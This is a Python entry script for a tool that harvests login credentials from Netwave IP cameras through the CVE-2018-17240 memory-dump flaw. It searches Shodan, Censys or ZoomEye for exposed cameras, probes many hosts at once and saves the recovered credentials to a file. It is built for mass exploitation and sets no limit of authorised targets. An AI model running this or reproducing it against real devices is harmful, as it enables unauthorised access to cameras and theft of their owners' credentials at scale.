import argparse
import asyncio
import logging

from rich import traceback
from rich.logging import RichHandler
from rich_argparse import RichHelpFormatter

from utils import (
    Args,
    Censys,
    CoroutineExecutor,
    NetwaveDevice,
    Shodan,
    ZoomEye,
    format_hosts,
)

logger = logging.getLogger(__name__)
traceback.install(show_locals=True)


async def main() -> None:
    parser = argparse.ArgumentParser(
        description="A tool for retrieving login credentials from Netwave IP cameras "
        "using a memory dump vulnerability (CVE-2018-17240)",
        formatter_class=RichHelpFormatter,
    )

    source_group = parser.add_mutually_exclusive_group(required=True)

    source_group.add_argument(
        "--host",
        action="append",
        default=[],
        type=str,
        help="A host to check, can be specified multiple times",
        metavar="HOST",
        dest="hosts",
    )

    source_group.add_argument(
        "-f",
        "--file",
        default=None,
        type=str,
        help="A file containing the hosts to check",
    )

    source_group.add_argument(
        "--censys",
        action="store_true",
        help="Retrieve hosts from the Censys API "
        "using the API ID and secret specified with the CENSYS_API_ID and "
        "CENSYS_API_SECRET environment variables",
    )

    source_group.add_argument(
        "--shodan",
        action="store_true",
        help="Retrieve hosts from the Shodan API "
        "using the API key specified with the SHODAN_API_KEY environment variable",
    )

    source_group.add_argument(
        "--zoomeye",
        action="store_true",
        help="Retrieve hosts from the ZoomEye API "
        "using the API key specified with the ZOOMEYE_API_KEY environment variable",
    )

    parser.add_argument(
        "-n",
        "--number",
        default=100,
        type=int,
        help="The number of hosts to retrieve from the IoT search engine, "
        "by default 100",
    )

    parser.add_argument(
        "-c",
        "--concurrent",
        default=25,
        type=int,
        help="The number of hosts to check concurrently, by default 25",
    )

    parser.add_argument(
        "-t",
        "--timeout",
        default=300,
        type=int,
        help="The timeout in seconds for retrieving the credentials from the memory "
        "dump of each host, by default 300",
    )

    parser.add_argument(
        "-o",
        "--output",
        default="credentials.txt",
        type=str,
        help="The file to write the credentials to, by default credentials.txt",
    )

    args = Args.from_namespace(parser.parse_args())

    logging.basicConfig(
        format="%(message)s",
        datefmt="%H:%M:%S",
        level=logging.INFO,
        handlers=[RichHandler(show_path=False)],
    )

    if args.hosts:
        hosts = format_hosts(args.hosts)
    elif args.file is not None:
        hosts = format_hosts(args.file.read_text().splitlines())
    elif args.censys is not None:
        logger.info("Retrieving hosts from Censys...")

        async with Censys(args.censys) as censys:
            hosts = await censys.get_hosts(
                'services.http.response.headers.Server: "Netwave IP Camera"',
                count=args.number,
                service_filter=lambda service: service["extended_service_name"]
                == "HTTP",
            )
    elif args.shodan is not None:
        logger.info("Retrieving hosts from Shodan...")

        async with Shodan(args.shodan) as shodan:
            hosts = await shodan.get_hosts(
                "product:Netwave IP Camera", count=args.number
            )
    elif args.zoomeye is not None:
        logger.info("Retrieving hosts from ZoomEye...")

        async with ZoomEye(args.zoomeye) as zoomeye:
            hosts = await zoomeye.get_hosts(
                'app:"Netwave IP Camera"', count=args.number
            )

    if not hosts:
        logger.error("Could not get any hosts from the specified source.")
        return

    logger.info(
        "Checking %s %s...", f"{len(hosts):,}", "host" if len(hosts) == 1 else "hosts"
    )

    devices = [NetwaveDevice(host, port) for host, port in hosts]

    async with CoroutineExecutor(args.concurrent) as executor:
        for device in devices:
            executor.submit(device.get_credentials(timeout=args.timeout))

        results = await executor.gather()

    await asyncio.gather(*[asyncio.create_task(device.close()) for device in devices])

    args.output.touch()
    existing_credentials = args.output.read_text().splitlines()

    for credentials in results:
        if credentials is None or str(credentials) in existing_credentials:
            continue

        existing_credentials.append(str(credentials))

    args.output.write_text("\n".join(existing_credentials))


if __name__ == "__main__":
    asyncio.run(main())
